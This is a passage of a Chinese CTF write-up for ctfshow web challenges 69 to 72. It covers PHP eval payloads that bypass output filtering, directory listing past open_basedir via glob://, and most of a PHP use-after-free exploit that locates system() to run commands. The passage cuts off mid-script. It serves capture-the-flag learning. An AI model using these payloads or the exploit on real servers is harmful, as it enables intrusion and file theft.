class="hljs-string">&#x27;/flag.txt&#x27;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h4 id="web69">web69</h4><p>代码同上，但<code>var_dump()</code>函数被禁止，可以使用类似函数（其他打印数组的函数）例如<code>var_export()</code>替代。</p><p><strong>知识点，几种读目录的方法：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-string">&quot;*&quot;</span>)); <span class="hljs-comment">// 列当前目录</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-string">&quot;/*&quot;</span>)); <span class="hljs-comment">// 列根目录</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&quot;.&quot;</span>));<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&quot;/&quot;</span>));<br><span class="hljs-variable">$d</span>=<span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-string">&quot;.&quot;</span>);<span class="hljs-keyword">while</span>(<span class="hljs-literal">false</span>!==(<span class="hljs-variable">$f</span>=<span class="hljs-title function_ invoke__">readdir</span>(<span class="hljs-variable">$d</span>)))&#123;<span class="hljs-keyword">echo</span><span class="hljs-string">&quot;<span class="hljs-subst">$f</span>\n&quot;</span>;&#125;<br><span class="hljs-variable">$d</span>=<span class="hljs-title function_ invoke__">dir</span>(<span class="hljs-string">&quot;.&quot;</span>);<span class="hljs-keyword">while</span>(<span class="hljs-literal">false</span>!==(<span class="hljs-variable">$f</span>=<span class="hljs-variable">$d</span>-&gt;<span class="hljs-title function_ invoke__">read</span>()))&#123;<span class="hljs-keyword">echo</span><span class="hljs-variable">$f</span>.<span class="hljs-string">&quot;\n&quot;</span>;&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-string">&quot;/*&quot;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-variable">$value</span>.<span class="hljs-string">&quot;   &quot;</span>;&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&#x27;glob:///*&#x27;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&quot; &quot;</span>);&#125;<br></code></pre></td></tr></table></figure><p>其余同上。</p><h4 id="web70">web70</h4><p>同上。</p><h4 id="web71">web71</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();     <span class="hljs-comment">//返回输出缓冲区的内容</span><br>        <span class="hljs-title function_ invoke__">ob_end_clean</span>();             <span class="hljs-comment">//清空（擦除）缓冲区并关闭输出缓冲</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-variable">$s</span>); <span class="hljs-comment">//内容匹配到数字字母的时候用？代替</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>后三行代码表示：任何输出缓冲区的字母数字都会被替代为？</p><p>由于替换缓冲区的代码位于eval函数后，只需要在eval()后加强制退出即可。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">c=var_export(scandir(<span class="hljs-string">&#x27;/&#x27;</span>));<span class="hljs-keyword">exit</span>();<br>c=include(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></table></figure><h4 id="web72">web72</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();     <span class="hljs-comment">//返回输出缓冲区的内容</span><br>        <span class="hljs-title function_ invoke__">ob_end_clean</span>();             <span class="hljs-comment">//清空（擦除）缓冲区并关闭输出缓冲</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-variable">$s</span>); <span class="hljs-comment">//内容匹配到数字字母的时候用？代替</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>本题增加了open_basedir()限制，<strong>知识点</strong>：</p><p>Open_basedir是PHP设置中为了防御PHP跨目录进行文件（目录）读写的方法，所有PHP中有关文件读、写的函数都会经过open_basedir的检查。Open_basedir实际上是一些目录的集合，在定义了open_basedir以后，php可以读写的文件、目录都将被限制在这些目录中。一般情况下，我们最多可以绕过open_basedir的限制对其进行列目录。绕过open_basedir进行读写文件危害较大，在php5.3以后很少有能够绕过open_basedir读写文件的方法。</p><p>绕过open_basedir<strong>进行列目录</strong>的方法：</p><ol type="1"><li>通过系统命令执行绕过</li></ol><p>open_basedir对系统函数并没有做相关的限制</p><ol start="2" type="1"><li>利用glob协议进行绕过</li></ol><p>glob://协议是php5.3.0以后一种查找匹配的文件路径模式。</p><p>用法一：借助DirectoryIterator</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);  <span class="hljs-comment">//打印根目录下的所有文件</span><br><span class="hljs-comment">//DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123; <br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>用法二：借助scandir()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;glob:///*&#x27;</span>));<br>&gt;<br></code></pre></td></tr></table></figure><p>之后需要利用UAF脚本（PWN）来读取，还没明白原理，以下是UAF脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ctfshow</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>, <span class="hljs-variable">$backtrace</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Vuln</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$backtrace</span>; <br>            <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>            <span class="hljs-variable">$backtrace</span> = (<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>)-&gt;<span class="hljs-title function_ invoke__">getTrace</span>();<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>])) &#123;<br>                <span class="hljs-variable">$backtrace</span> = <span class="hljs-title function_ invoke__">debug_backtrace</span>();<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>, <span class="hljs-variable">$d</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$s</span>-<span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>            <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>            <span class="hljs-variable">$address</span> |= <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span>+<span class="hljs-variable">$j</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params"><span class="hljs-variable">$ptr</span>, <span class="hljs-variable">$m</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$m</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$out</span> .= <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$ptr</span> &amp; <span class="hljs-number">0xff</span>));<br>            <span class="hljs-variable">$ptr</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$v</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$v</span> &amp; <span class="hljs-number">0xff</span>));<br>            <span class="hljs-variable">$v</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x68</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$p</span> - <span class="hljs-number">0x10</span>);<br>        <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$helper</span>-&gt;a);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$s</span> != <span class="hljs-number">8</span>) &#123; <span class="hljs-variable">$leak</span> %= <span class="hljs-number">2</span> &lt;&lt; (<span class="hljs-variable">$s</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>; &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$leak</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parse_elf</span>(<span class="hljs-params"><span class="hljs-variable">$base</span></span>) </span>&#123;<br>        <span class="hljs-variable">$e_type</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-variable">$e_phoff</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x20</span>);<br>        <span class="hljs-variable">$e_phentsize</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-variable">$e_phnum</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$e_phnum</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$header</span> = <span class="hljs-variable">$base</span> + <span class="hljs-variable">$e_phoff</span> + <span class="hljs-variable">$i</span> * <span class="hljs-variable">$e_phentsize</span>;<br>            <span class="hljs-variable">$p_type</span>  = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_flags</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_vaddr</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x10</span>);<br>            <span class="hljs-variable">$p_memsz</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x28</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">6</span>) &#123; <br><br>                <span class="hljs-variable">$data_addr</span> = <span class="hljs-variable">$e_type</span> == <span class="hljs-number">2</span> ? <span class="hljs-variable">$p_vaddr</span> : <span class="hljs-variable">$base</span> + <span class="hljs-variable">$p_vaddr</span>;<br>                <span class="hljs-variable">$data_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">5</span>) &#123; <br>                <span class="hljs-variable">$text_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data_addr</span> || !<span class="hljs-variable">$text_size</span> || !<span class="hljs-variable">$data_size</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">return</span> [<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>];<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span></span>) </span>&#123;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>) = <span class="hljs-variable">$elf</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$data_size</span> / <span class="hljs-number">8</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x746e6174736e6f63</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, (<span class="hljs-variable">$i</span> + <span class="hljs-number">4</span>) * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x786568326e6962</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$data_addr</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_binary_base</span>(<span class="hljs-params"><span class="hljs-variable">$binary_leak</span></span>) </span>&#123;<br>        <span class="hljs-variable">$base</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$start</span> = <span class="hljs-variable">$binary_leak</span> &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x1000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$i</span>;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> == <span class="hljs-number">0x10102464c457f</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$addr</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$f_entry</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>);<br>            <span class="hljs-variable">$f_name</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> == <span class="hljs-number">0x6d6574737973</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> != <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">trigger_uaf</span>(<span class="hljs-params"><span class="hljs-variable">$arg</span></span>) </span>&#123;<br><br>        <span class="hljs-variable">$arg</span> = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br>        <span class="hljs-variable">$vuln</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuln</span>();<br>        <span class="hljs-variable">$vuln</span>-&gt;a = <span class="hljs-variable">$arg</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(PHP_OS, <span class="hljs-string">&#x27;WIN&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;This PoC is for *nix systems only.&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$n_alloc</span> = <span class="hljs-number">10</span>; <br>    <span class="hljs-variable">$contiguous</span> = [];<br>    <span 